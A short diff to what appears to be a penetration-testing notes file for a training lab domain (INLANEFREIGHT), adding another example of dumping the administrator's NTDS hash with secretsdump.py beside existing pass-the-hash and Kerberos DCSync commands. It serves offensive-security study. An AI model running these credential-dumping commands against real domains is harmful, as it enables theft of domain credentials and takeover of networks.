@@ -24,5 +24,8 @@ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404
 secretsdump.py -just-dc-user $domain/administrator -k -no-pass "$hostName"@$hostName.$domain
 # Example:
 # secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+# Another example of dumpling NTDS with SecretsDump
+secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
 ```
 
